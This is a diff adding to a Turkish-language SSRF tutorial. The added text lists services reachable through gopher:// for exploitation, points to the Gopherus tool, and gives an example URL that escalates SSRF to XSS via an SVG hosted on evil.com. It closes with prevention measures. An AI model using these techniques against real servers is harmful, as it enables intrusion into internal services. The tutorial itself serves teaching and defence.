@@ -89,3 +89,37 @@ Bu örnekte:
 
 Sunucu bu isteği gönderebilir ve internal servislere komut çalıştırabilir.
 
+Aşağıdaki hizmetler gopher tarafındandesteklenir:
+- MySQL
+- PostgreSQL
+- FastCGI
+- Redis
+- SMTP
+- Zabbix
+- pymemcache
+- rbmemcache
+- phpmemcache
+- dmpmemcache
+
+Aşağıdaki tool gopher ile exploiti kolaylaştırabilir.
+- https://github.com/tarunkant/Gopherus
+
+# XSS'e yükseltme
+Javascript kodu içeren bir SVG dosyası dahil ederek SSRF'yi bir XSS'ye yükseltmeyi deneyebilirsiniz.
+```
+https://example.com/ssrf.php?url=http://evil.com/poc.svg
+```
+
+# SSRF Önleme ve Kapatma Yöntemleri
+SSRF zafiyetlerini tamamen önlemek için uygulama seviyesinde birden fazla önlem bir arada uygulanmalıdır:
+1. Kullanıcı Girdilerini Doğrulama
+- Kullanıcıdan gelen URL’leri veya hostname’leri mutlaka whitelist ile kontrol edin.
+- Sadece izin verilen domain veya IP’lere erişime izin verin.
+
+2. URL Şemalarını Kısıtlama
+- Sadece HTTP ve HTTPS gibi güvenli protokolleri kabul edin. 
+- file://, gopher://, ftp:// gibi potansiyel tehlikeli protokolleri reddedin.
+
+3. Dahili Kaynaklara Erişimi Kısıtlama
+- Sunucunun internal network’e veya metadata servislerine doğrudan erişimi mümkün olduğunca kısıtlayın.
+- Cloud ortamlarında meta-data servisini sadece gerekli servislerin kullanabileceği şekilde yapılandırın.
